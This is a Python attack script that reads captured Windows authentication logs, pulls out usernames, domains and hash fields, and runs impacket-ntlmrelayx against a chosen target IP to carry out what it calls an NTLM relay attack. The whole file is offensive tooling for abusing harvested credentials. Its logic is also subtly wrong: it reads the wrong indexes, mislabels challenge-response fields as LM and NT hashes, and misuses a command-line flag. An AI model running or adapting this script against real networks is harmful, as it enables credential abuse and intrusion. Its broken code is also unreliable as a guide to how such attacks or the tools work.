import argparse
import subprocess


def parse_hash_file(file_path):
    print(f"Parsing hash file: {file_path}")
    credentials = []
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
            print(f"Total lines read from file: {len(lines)}")

            for i in range(len(lines)):
                line = lines[i].strip()
                print(f"Processing line: {line}")

                if 'authenticated successfully' in line:
                    parts = line.split()
                    user_info = parts[2]  # LACHINGONA\gris
                    domain, username = user_info.split('\\')
                    print(f"Extracted domain: {domain}, username: {username}")

                    if i + 1 < len(lines):
                        hash_line = lines[i + 1].strip()
                        if '::' in hash_line:
                            hash_parts = hash_line.split(':')
                            if len(hash_parts) >= 5:
                                lmhash = hash_parts[4]
                                nthash = hash_parts[5]
                                print(f"Extracted hashes - LMHash: {lmhash}, NTHash: {nthash}")

                                try:
                                    bytes.fromhex(lmhash)
                                    bytes.fromhex(nthash)
                                    credentials.append((username, domain, lmhash, nthash))
                                    print(f"Added credentials: {username}, {domain}, {lmhash}, {nthash}")
                                except ValueError:
                                    print(f"Invalid hash format in line: {hash_line}")
                            else:
                                print(f"Hash line does not contain expected number of parts: {hash_line}")
                        else:
                            print(f"Hash line does not contain '::': {hash_line}")
                    else:
                        print("No subsequent line found for hashes.")

            print(f"Found {len(credentials)} valid credentials")
            return credentials
    except Exception as e:
        print(f"Failed to parse hash file: {e}")
        return []
    
def ntlm_relay(target_ip, credentials):
    for username, domain, lmhash, nthash in credentials:
        print(f"\nAttempting NTLM relay attack with:")
        print(f"  Username: {username}")
        print(f"  Domain: {domain}")
        print(f"  LMHash: {lmhash}")
        print(f"  NTHash: {nthash}")

        try:
            # Construir y ejecutar el comando ntlmrelayx.py
            command = [
                "impacket-ntlmrelayx",
                "-t", f"{target_ip}",
                "-smb2support",
                "-wh",
                f"{username}:{domain}:{lmhash}:{nthash}"
            ]
            
            print(f"Running command: {' '.join(command)}")
            subprocess.run(command, check=True)
            
            print(f"NTLM relay attack completed successfully for {username}@{domain}!")
            
        except subprocess.CalledProcessError as e:
            print(f"Failed to execute ntlmrelayx.py: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform NTLM relay attack using credentials from a hash file.")
    parser.add_argument('--target-ip', required=True, help="Target IP address")
    parser.add_argument('--hash-file', required=True, help="File containing usernames and NTLM hashes")

    args = parser.parse_args()

    print(f"Target IP: {args.target_ip}")
    print(f"Hash File: {args.hash_file}")

    credentials = parse_hash_file(args.hash_file)

    if not credentials:
        print("No valid credentials found. Exiting.")
    else:
        print(f"Valid credentials found: {credentials}")
        ntlm_relay(args.target_ip, credentials)

